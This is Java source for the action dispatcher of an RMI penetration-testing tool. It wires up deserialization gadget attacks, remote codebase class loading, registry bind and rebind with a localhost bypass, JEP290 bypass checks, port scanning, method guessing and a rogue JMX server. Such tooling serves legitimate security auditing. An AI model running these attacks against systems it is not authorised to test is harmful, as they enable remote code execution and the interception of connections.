package de.qtc.rmg.operations;

import java.io.IOException;
import java.rmi.NoSuchObjectException;
import java.rmi.server.ObjID;
import java.util.EnumSet;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import javax.management.remote.rmi.RMIServer;

import de.qtc.rmg.endpoints.KnownEndpoint;
import de.qtc.rmg.endpoints.KnownEndpointHolder;
import de.qtc.rmg.exceptions.UnexpectedCharacterException;
import de.qtc.rmg.internal.ArgumentHandler;
import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.internal.RMGOption;
import de.qtc.rmg.internal.RMIComponent;
import de.qtc.rmg.io.Formatter;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.SampleWriter;
import de.qtc.rmg.io.WordlistHandler;
import de.qtc.rmg.networking.RMIEndpoint;
import de.qtc.rmg.networking.RMIRegistryEndpoint;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RemoteObjectWrapper;
import de.qtc.rmg.utils.RogueJMX;
import de.qtc.rmg.utils.UnicastWrapper;
import de.qtc.rmg.utils.YsoIntegration;
import javassist.CannotCompileException;
import javassist.NotFoundException;

/**
 * The dispatcher class contains all method definitions for the different rmg actions. It obtains a reference
 * to the ArgumentParser object and extracts all required arguments parameters for the corresponding method calls.
 *
 * Methods within the Dispatcher class can be annotated with the Parameters annotation to specify additional requirements
 * on their expected arguments. Refer to the de.qtc.rmg.annotations.Parameters class for more details.
 *
 * To add a new operation to rmg, the operation  must first be registered within the de.qtc.rmg.operations.Operation class.
 * A new Operation needs to be created there that references the corresponding method within this class.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class Dispatcher
{
    private ArgumentHandler p;

    private String[] boundNames = null;
    private MethodCandidate candidate = null;
    private RMIRegistryEndpoint rmiReg = null;
    private RemoteObjectWrapper[] remoteObjects = null;

    /**
     * Creates the dispatcher object.
     *
     * @param p ArgumentParser object that contains the current command line specifications
     */
    public Dispatcher(ArgumentHandler p)
    {
        this.p = p;
    }

    /**
     * Obtains a list of bound names from the RMI registry and stores it into an object attribute.
     *
     * @throws java.rmi.NoSuchObjectException is thrown when the specified RMI endpoint is not an RMI registry
     */
    private void obtainBoundNames() throws NoSuchObjectException
    {
        if(boundNames != null)
        {
            return;
        }

        boundNames = getRegistry().getBoundNames();
    }

    /**
     * Performs the RMI lookup operation to request remote objects from the RMI registry. If no bound name
     * was specified on the command line, all registered bound names within the RMI registry are looked up.
     * The result is stored within an object attribute.
     *
     * It was observed that using --serial-version-uid option can cause an invalid transport return code
     * exception. This seems to be some kind of race condition and cannot be reproduced reliably. The lookup
     * operation on the RMI registry does pass only this UnmarshalException to the caller. If this is the case,
     * we just retry a few times.
     *
     * @throws java.rmi.NoSuchObjectException is thrown when the specified RMI endpoint is not an RMI registry
     */
    private void obtainBoundObjects() throws NoSuchObjectException
    {
        int retryCount = 0;

        if (boundNames == null)
        {
            obtainBoundNames();
        }

        while (retryCount < 5)
        {
            try
            {
                remoteObjects = getRegistry().lookup(boundNames);
                return;
            }

            catch (java.rmi.UnmarshalException e)
            {
                retryCount += 1;
            }

            catch (Exception e)
            {
                ExceptionHandler.unexpectedException(e, "lookup", "operation", true);
            }
        }
    }

    /**
     * Creates a method candidate from the specified signature on the command line.
     */
    private void createMethodCandidate()
    {
        if (!RMGOption.TARGET_SIGNATURE.notNull())
        {
            return;
        }

        String signature = RMGOption.TARGET_SIGNATURE.getValue();

        try
        {
            candidate = new MethodCandidate(signature);
        }

        catch (CannotCompileException | NotFoundException e)
        {
            ExceptionHandler.invalidSignature(signature);
        }
    }

    /**
     * Creates an RMIEndpoint object from the target host and port specified on the command line.
     * Additionally initializes the method candidate attribute if a method signature was specified.
     *
     * @return RMIEndpoint to the host:port configuration specified on the command line
     */
    public RMIEndpoint getRMIEndpoint()
    {
        int port = RMGOption.require(RMGOption.TARGET_PORT);
        String host = RMGOption.require(RMGOption.TARGET_HOST);

        this.createMethodCandidate();
        return new RMIEndpoint(host, port);
    }

    /**
     * By default, the dispatcher class treats remote endpoints as generic RMI endpoints. When an RMIRegistryEndpoint
     * is required, this function should be used to obtain one.
     *
     * @return RMIRegistryEndpoint
     */
    private RMIRegistryEndpoint getRegistry()
    {
        return getRegistry(getRMIEndpoint());
    }

    /**
     * Create an RMIRegistryEndpoint from an existing RMIEndpoint.
     *
     * @param rmi RMIEndpoint pointing to the target registry
     * @return RMIRegistryEndpoint
     */
    private RMIRegistryEndpoint getRegistry(RMIEndpoint rmi)
    {
        if (rmiReg == null)
        {
            rmiReg = new RMIRegistryEndpoint(rmi);
        }

        return rmiReg;
    }

    /**
     * Create an RemoteObjectClient from an existing RMIEndpoint.
     *
     * @param rmi RMIEndpoint pointing to the RMI service
     * @return RemoteObjectClient
     */
    private RemoteObjectClient getRemoteObjectClient(RMIEndpoint rmi)
    {
        RMGOption.requireOneOf(RMGOption.TARGET_OBJID, RMGOption.TARGET_BOUND_NAME, RMGOption.TARGET_COMPONENT);

        if (RMGOption.TARGET_BOUND_NAME.isNull() && RMGOption.TARGET_OBJID.isNull())
        {
            RMIComponent component = p.getComponent();
            RMGOption.TARGET_OBJID.setValue( RMGUtils.getObjIDByComponent(component).toString() );
        }

        return getRemoteObjectClient(RMGOption.TARGET_OBJID.getValue(), RMGOption.TARGET_BOUND_NAME.getValue(), rmi);
    }

    /**
     * A RemoteObjectClient is used for communication to user registered RMI objects (anything other than
     * registry, DGC or activator). This function returns a corresponding object that can be used for the
     * communication. If an ObjID was specified on the command line, this ObjID is used as a target. Otherwise
     * the client needs to be created for one particular bound name.
     *
     * @return RemoteObjectClient that can be used to communicate to the specified RMI object
     */
    private RemoteObjectClient getRemoteObjectClient(String objIDString, String boundName, RMIEndpoint rmi)
    {
        if (objIDString != null)
        {
            ObjID objID = RMGUtils.parseObjID(objIDString);
            return new RemoteObjectClient(rmi, objID);
        }

        else if (boundName != null)
        {
            return new RemoteObjectClient(getRegistry(rmi), boundName);
        }

        else
        {
            ExceptionHandler.missingTarget(p.getAction().name());
            return null;
        }
    }

    /**
     * Is expected to be called other the method guessing. Takes a HashMap of bound name -> [MethodCandidate]
     * pairs and writes sample files for each bound name. The sample files contain Java code that can be used to
     * call the corresponding remote methods.
     *
     * @param results List of RemoteObjectClients containing successfully guessed methods.
     */
    private void writeSamples(List<RemoteObjectClient> results)
    {
        if (results.size() == 0)
        {
            return;
        }

        String templateFolder = RMGOption.GUESS_TEMPLATE_FOLDER.getValue();
        String sampleFolder = RMGOption.GUESS_SAMPLE_FOLDER.getValue();
        boolean sslValue = RMGOption.CONN_SSL.getBool();
        boolean followRedirect = RMGOption.CONN_FOLLOW.getBool();

        Logger.lineBreak();
        Logger.println("Starting creation of sample files:");
        Logger.lineBreak();
        Logger.increaseIndent();

        try
        {
            SampleWriter writer = new SampleWriter(templateFolder, sampleFolder, sslValue, followRedirect);

            for (RemoteObjectClient client: results)
            {
                RemoteObjectWrapper remoteObject = client.remoteObject;

                for (String boundName : client.getBoundNames())
                {
                    Logger.printlnMixedYellow("Creating samples for bound name", boundName + ".");
                    Logger.increaseIndent();

                    if (!remoteObject.isKnown())
                    {
                        writer.createInterface(boundName, remoteObject.getInterfaceName(), client.remoteMethods);
                    }

                    writer.createSamples(boundName, remoteObject.getInterfaceName(), !remoteObject.isKnown(), client.remoteMethods, getRMIEndpoint());

                    Logger.decreaseIndent();
                }
            }
        }

        catch (IOException | CannotCompileException | NotFoundException e)
        {
            ExceptionHandler.unexpectedException(e, "sample", "creation", true);
        }

        catch (UnexpectedCharacterException e)
        {
            Logger.eprintlnMixedYellow("Caught", "UnexpectedCharacterException", "during sample creation.");
            Logger.eprintln("This is caused by special characters within bound- or classes names.");
            Logger.eprintlnMixedYellow("You can enforce sample creation with the", "--trusted", "switch.");
            RMGUtils.exit();
        }

        Logger.decreaseIndent();
    }

    /**
     * Parses the user specified wordlist options and creates a corresponding list of MethodCandidates.
     *
     * @return HashSet of MethodCandidates that should be used during guessing operations
     */
    private Set<MethodCandidate> getCandidates()
    {
        Set<MethodCandidate> candidates = new HashSet<MethodCandidate>();

        String wordlistFile = RMGOption.GUESS_WORDLIST_FILE.getValue();
        String wordlistFolder = RMGOption.GUESS_WORDLIST_FOLDER.getValue();
        boolean zeroArg = RMGOption.GUESS_ZERO_ARG.getBool();
        boolean updateWordlist = RMGOption.GUESS_UPDATE.getBool();

        if (candidate != null)
        {
            candidates.add(candidate);
        }

        else
        {
            try
            {
                WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlist, zeroArg);
                candidates = wlHandler.getWordlistMethods();
            }

            catch (IOException e)
            {
                Logger.eprintlnMixedYellow("Caught", "IOException", "while reading wordlist file(s).");
                ExceptionHandler.stackTrace(e);
                RMGUtils.exit();
            }
        }

        return candidates;
    }

    /**
     * Dispatches the listen action. Basically just a handover to ysoserial.
     */
    public void dispatchListen()
    {
        String listenerIP = RMGOption.require(RMGOption.LISTEN_IP);
        int listenerPort = RMGOption.require(RMGOption.LISTEN_PORT);

        YsoIntegration.createJRMPListener(listenerIP, listenerPort, p.getGadget());
    }

    /**
     * Performs deserialization attacks on default RMI components (RMI registry, DGC, Activator).
     * The targeted component needs to be specified within the --signature option.
     */
    public void dispatchSerial()
    {
        RMGOption.requireTarget();

        RMIEndpoint rmi = getRMIEndpoint();
        RMIComponent component = p.getComponent();

        if (component == null)
        {
            if (candidate == null)
            {
                ExceptionHandler.missingSignature();
            }

            int argumentPosition = RMGOption.ARGUMENT_POS.getValue();

            RemoteObjectClient client = getRemoteObjectClient(rmi);
            client.gadgetCall(candidate, p.getGadget(), argumentPosition);
        }

        else
        {
            switch (component)
            {
                case ACTIVATOR:
                    ActivationClient act = new ActivationClient(rmi);
                    act.gadgetCall(p.getGadget());
                    break;

                case REGISTRY:
                    String regMethod = p.getRegMethod();
                    boolean localhostBypass = RMGOption.BIND_BYPASS.getBool();

                    RegistryClient reg = new RegistryClient(rmi);
                    reg.gadgetCall(p.getGadget(), regMethod, localhostBypass);
                    break;

                case DGC:
                    String dgcMethod = p.getDgcMethod();

                    DGCClient dgc = new DGCClient(rmi);
                    dgc.gadgetCall(dgcMethod, p.getGadget());
                    break;

                default:
                    break;
            }
        }
    }

    /**
     * Performs the genericCall operation on a RemoteObjectClient object. Used for legitimate
     * RMI calls on user registered RMI objects. Targets can be specified by bound name or ObjID.
     */
    public void dispatchCall()
    {
        RMIEndpoint rmi = getRMIEndpoint();
        Object[] argumentArray = p.getCallArguments();

        if (candidate == null)
        {
            ExceptionHandler.missingSignature();
        }

        if (argumentArray.length != candidate.getArgumentCount())
        {
            ExceptionHandler.wrongArgumentCount(candidate.getArgumentCount(), argumentArray.length);
        }

        RemoteObjectClient client = getRemoteObjectClient(rmi);
        client.genericCall(candidate, argumentArray);
    }

    /**
     * Performs a codebase attack. The actual target is determined by the value of the --signature
     * option. If the signature is a real method signature, a target needs to  be specified by
     * bound name or ObjID. Otherwise, the --signature is expected to be one of act, dgc or reg.
     */
    public void dispatchCodebase()
    {
        RMGOption.requireTarget();

        String codebase = RMGOption.require(RMGOption.CODEBASE_URL);
        String className = RMGOption.require(RMGOption.CODEBASE_CLASS);
        RMGUtils.setCodebase(codebase);

        Object payload = null;
        RMIEndpoint rmi = getRMIEndpoint();
        RMIComponent component = p.getComponent();
        int argumentPosition = RMGOption.ARGUMENT_POS.getValue();

        try
        {
            payload = RMGUtils.makeSerializableClass(className, RMGOption.PAYLOAD_SERIAL_VERSION_UID.getValue());
            payload = ((Class<?>)payload).newInstance();
        }

        catch (CannotCompileException | InstantiationException | IllegalAccessException e)
        {
            ExceptionHandler.unexpectedException(e, "payload", "creation", true);
        }

        if (component == null)
        {
            if (candidate == null)
            {
                ExceptionHandler.missingSignature();
            }

            RemoteObjectClient client = getRemoteObjectClient(rmi);
            client.codebaseCall(candidate, payload, argumentPosition);

        } else if( component == RMIComponent.DGC ) {

            DGCClient dgc = new DGCClient(rmi);
            dgc.codebaseCall(p.getDgcMethod(), payload);
        }

        else if (component == RMIComponent.REGISTRY)
        {
            RegistryClient reg = new RegistryClient(rmi);
            reg.codebaseCall(payload, p.getRegMethod(), RMGOption.BIND_BYPASS.getBool());
        }

        else if (component == RMIComponent.ACTIVATOR)
        {
            ActivationClient act = new ActivationClient(rmi);
            act.codebaseCall(payload);
        }

        else
        {
            ExceptionHandler.internalError("dispatchCodebase", "No target was selected.");
        }
    }

    /**
     * Performs the bind operation on the RegistryClient object. Binds the user specified gadget to
     * the targeted registry.
     */
    public void dispatchBind()
    {
        RMIEndpoint rmi = getRMIEndpoint();
        String boundName = RMGOption.BIND_BOUND_NAME.getValue();

        RegistryClient reg = new RegistryClient(rmi);
        reg.bindObject(boundName, p.getGadget(), RMGOption.BIND_BYPASS.getBool());
    }

    /**
     * Performs the rebind operation on the RegistryClient object. Binds the user specified gadget to
     * the targeted registry.
     */
    public void dispatchRebind()
    {
        RMIEndpoint rmi = getRMIEndpoint();
        String boundName = RMGOption.BIND_BOUND_NAME.getValue();

        RegistryClient reg = new RegistryClient(rmi);
        reg.rebindObject(boundName, p.getGadget(), RMGOption.BIND_BYPASS.getBool());
    }

    /**
     * Performs the unbind operation on the RegistryClient object. Removes a bound name from the
     * targeted registry endpoint.
     */
    public void dispatchUnbind()
    {
        RMIEndpoint rmi = getRMIEndpoint();
        String boundName = RMGOption.BIND_BOUND_NAME.getValue();

        RegistryClient reg = new RegistryClient(rmi);
        reg.unbindObject(boundName, RMGOption.BIND_BYPASS.getBool());
    }

    /**
     * Performs rmg's enumeration action. During this action, several different vulnerability types
     * are enumerated.
     */
    public void dispatchEnum()
    {
        RMGUtils.enableCodebase();
        RMIEndpoint rmi = getRMIEndpoint();

        Formatter format = new Formatter();
        DGCClient dgc = new DGCClient(rmi);
        RegistryClient registryClient = new RegistryClient(rmi);
        EnumSet<ScanAction> actions = p.getScanActions();

        boolean enumJEP290Bypass = true;
        boolean marshal = true;

        try
        {
            if (actions.contains(ScanAction.LIST))
            {
                obtainBoundNames();

                if (!RMGOption.SSRFRESPONSE.notNull() || RMGOption.TARGET_BOUND_NAME.notNull())
                {
                    obtainBoundObjects();
                    format.listBoundNames(remoteObjects);

                    Logger.lineBreak();
                    format.listCodebases();
                }

                else
                {
                    remoteObjects = RemoteObjectWrapper.fromBoundNames(boundNames);
                    format.listBoundNames(remoteObjects);
                }

                if (RMGOption.SSRFRESPONSE.notNull())
                {
                    return;
                }
            }

            if (actions.contains(ScanAction.STRING_MARSHALLING))
            {
                Logger.lineBreak();
                marshal = registryClient.enumerateStringMarshalling();
            }

            if (actions.contains(ScanAction.CODEBASE))
            {
                Logger.lineBreak();
                registryClient.enumCodebase(marshal, p.getRegMethod(), RMGOption.ENUM_BYPASS.getBool());
            }

            if (actions.contains(ScanAction.LOCALHOST_BYPASS))
            {
                Logger.lineBreak();
                registryClient.enumLocalhostBypass();
            }
        }

        catch (java.rmi.NoSuchObjectException e)
        {
            ExceptionHandler.noSuchObjectExceptionRegistryEnum();
            enumJEP290Bypass = false;

            Logger.lineBreak();
            format.listCodebases();
        }

        if (actions.contains(ScanAction.SECURITY_MANAGER))
        {
            Logger.lineBreak();
            dgc.enumSecurityManager(p.getDgcMethod());
        }

        if (actions.contains(ScanAction.JEP290))
        {
            Logger.lineBreak();
            dgc.enumJEP290(p.getDgcMethod());
        }

        if (enumJEP290Bypass && actions.contains(ScanAction.FILTER_BYPASS))
        {
            Logger.lineBreak();
            registryClient.enumJEP290Bypass(p.getRegMethod(), RMGOption.ENUM_BYPASS.getBool(), marshal);
        }

        if (actions.contains(ScanAction.ACTIVATOR))
        {
            Logger.lineBreak();
            ActivationClient activationClient = new ActivationClient(rmi);
            activationClient.enumActivator();
        }
    }

    /**
     * Performs a method guessing attack. During this operation, the specified wordlist files are parsed
     * for valid method definitions and each method is invoked on the targeted RMI endpoint. Currently, this
     * operation is only supported on registry endpoints and cannot be performed using the --objid option.
     */
    public void dispatchGuess()
    {
        Formatter format = new Formatter();

        try
        {
            obtainBoundObjects();
        }

        catch (NoSuchObjectException e)
        {
            ExceptionHandler.noSuchObjectException(e, "registry", true);
        }

        UnicastWrapper[] wrappers = RemoteObjectWrapper.getUnicastWrappers(remoteObjects);
        MethodGuesser guesser = new MethodGuesser(wrappers, getCandidates());
        guesser.printGuessingIntro();

        List<RemoteObjectClient> results = guesser.guessMethods();

        Logger.decreaseIndent();
        format.listGuessedMethods(results);

        if (results.size() > 0 && RMGOption.GUESS_CREATE_SAMPLES.getBool())
        {
            this.writeSamples(results);
        }
    }

    /**
     * Is called when using remote-method-guesser's 'known' action. Actually requires only a single
     * argument that is the class name to lookup within the database of KnownEndpoints. However, due
     * to the argument parsing logic of remote-method-guesser, you need to specify the host and port
     * arguments as well.
     */
    public void dispatchKnown()
    {
        String className = RMGOption.require(RMGOption.KNOWN_CLASS);
        Formatter formatter = new Formatter();

        KnownEndpointHolder keh = KnownEndpointHolder.getHolder();
        KnownEndpoint endpoint = keh.lookup(className);

        if (endpoint == null)
        {
            Logger.eprintlnMixedYellow("The specified class name", className, "isn't a known class.");
        }

        else
        {
            formatter.listKnownEndpoint(endpoint);
        }
    }

    /**
     * Performs a primitive portscan for RMI services. Targeted ports are usually obtained from the
     * configuration file, but can also be supplied by the user.
     */
    public void dispatchPortScan()
    {
        String host = RMGOption.require(RMGOption.TARGET_HOST);
        int[] rmiPorts = p.getRmiPorts();

        Logger.printMixedYellow("Scanning", String.valueOf(rmiPorts.length), "Ports on ");
        Logger.printlnPlainMixedBlueFirst(host, "for RMI services.");
        Logger.lineBreak();
        Logger.increaseIndent();

        PortScanner ps = new PortScanner(host, rmiPorts);
        ps.portScan();

        Logger.decreaseIndent();
        Logger.lineBreak();

        Logger.println("Portscan finished.");
    }

    /**
     * Prints detailed information on the user specified ObjID.
     */
    public void dispatchObjID()
    {
        String objIDString = RMGOption.require(RMGOption.OBJID_OBJID);

        ObjID objID = RMGUtils.parseObjID(objIDString);
        RMGUtils.printObjID(objID);
    }

    /**
     * Creates a rogue JMX server. The target specification which normally identifies the
     * remote endpoint is used to identify where the rogue JMX server should listen. An
     * additional endpoint specification can be made using host:port syntax to forward jmx
     * connections to.
     */
    public void dispatchRogueJMX()
    {
        int listenerPort = RMGOption.require(RMGOption.LISTEN_PORT);
        String listenerHost = RMGOption.require(RMGOption.LISTEN_IP);

        RogueJMX rogueJMX = new RogueJMX(listenerHost, listenerPort, RMGOption.ROGUEJMX_OBJID.getValue());

        if (RMGOption.ROGUEJMX_FORWARD_HOST.notNull())
        {
            String forwardHost = RMGOption.ROGUEJMX_FORWARD_HOST.getValue();
            int forwardPort = RMGOption.require(RMGOption.ROGUEJMX_FORWARD_PORT);

            String boundName = RMGOption.ROGUEJMX_FORWARD_BOUND_NAME.getValue();
            String objid = RMGOption.ROGUEJMX_FORWARD_OBJID.getValue();

            RMIEndpoint rmi = new RMIEndpoint(forwardHost, forwardPort);
            RemoteObjectClient client = getRemoteObjectClient(objid, boundName, rmi);
            client.assignInterface(RMIServer.class);

            rogueJMX.forwardTo(client);
        }

        try
        {
            rogueJMX.export();
            Logger.lineBreak();
        }

        catch (java.rmi.RemoteException e)
        {
            ExceptionHandler.unexpectedException(e, "exporting", "rogue JMX server", true);
        }
    }
}
